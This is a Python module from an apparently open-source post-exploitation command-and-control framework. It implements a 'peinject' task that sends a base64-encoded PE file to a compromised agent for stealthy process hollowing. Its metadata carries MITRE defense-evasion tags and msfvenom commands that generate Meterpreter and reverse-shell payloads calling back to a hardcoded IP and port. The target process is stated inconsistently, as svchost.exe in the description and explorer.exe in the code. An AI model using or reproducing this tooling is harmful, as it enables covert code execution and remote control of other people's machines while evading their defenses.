"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "peinject",
        "description": "Stealthily inject a PE file into a target process (svchost.exe) on Windows systems using process hollowing without touching disk",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/Neo",
            "https://www.rapid7.com/docs/msfvenom/"
        ],
        "technique_id": "T1055",  # Process Injection
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PE injection on",
                "required": True
            },
            "pe_file": {
                "description": "Path to the PE file to inject on client machine",
                "required": True
            }
        },
        "notes": {
            "msfvenom_examples": [
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f exe",
                "msfvenom -p windows/x64/exec CMD='calc.exe' -f exe",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f exe"
            ]
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    pe_input = options.get("pe_file")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not pe_input:
        return {
            "success": False,
            "error": "PE file is required"
        }

    session.current_agent = agent_id

    # Check if pe_input is already base64 encoded content (indicates client-side file)
    if "FILE_NOT_FOUND_ON_CLIENT" in pe_input:
        # Special flag indicating the file was not found on the client side
        return {
            "success": False,
            "error": f"PE file not found on client: {pe_input.replace(' FILE_NOT_FOUND_ON_CLIENT', '')}. No server-side fallback mechanism - file must exist on client."
        }
    elif _is_base64(pe_input):
        # The pe_input is already base64 encoded content from the client
        # No additional prefixing needed - the agent expects base64 content directly
        prefixed_encoded_pe = pe_input
    else:
        # The CLI should have already handled file lookup and sent base64 content
        # If we get here, it means the CLI didn't properly handle the file lookup
        return {
            "success": False,
            "error": f"Invalid input format. CLI should send base64 encoded PE content, but received: {pe_input[:50]}..."
        }

    command = f"peinject {prefixed_encoded_pe}"

    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] PE injection prepared for interactive mode",
            "command": command,
            "target_process": "explorer.exe"
        }
    elif not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    else:
        # Queue the task on the agent
        try:
            agent_manager = session.agent_manager
            task_id = agent_manager.add_task(agent_id, command)
            if task_id:
                return {
                    "success": True,
                    "output": f"[x] PE injection task {task_id} queued for agent {agent_id}",
                    "task_id": task_id,
                    "target_process": "explorer.exe"
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }


def process_pe_input(pe_input):
    if isinstance(pe_input, bytes):
        return pe_input

    if not isinstance(pe_input, str):
        raise ValueError("PE file input must be a string (file path) or bytes")

    # If it's a base64 string, process it directly
    if is_base64(pe_input):
        try:
            decoded = base64.b64decode(pe_input)
            return decoded
        except Exception:
            pass  # Not valid base64, continue to other formats

    # If it's a hex string, convert it
    clean_hex = pe_input.replace('0x', '').replace(',', '').replace('\\', '').replace(' ', '').replace('\n', '').replace('\t', '')
    if re.match(r'^[0-9a-fA-F]+$', clean_hex) and len(clean_hex) % 2 == 0:
        try:
            result = bytes.fromhex(clean_hex)
            return result
        except ValueError:
            raise ValueError("Invalid hex string for PE file")

    # The CLI should have already handled file lookup and sent proper content
    # If we get here, the format is invalid
    raise ValueError(f"Invalid PE input format. Expected base64 encoded content from CLI, but received: {pe_input[:50]}...")


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False


def is_base64(s):
    try:
        if len(s) % 4 != 0:
            return False

        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        decoded = base64.b64decode(s)
        encoded = base64.b64encode(decoded).decode('utf-8')
        return encoded == s.strip('=')
    except Exception:
        return False
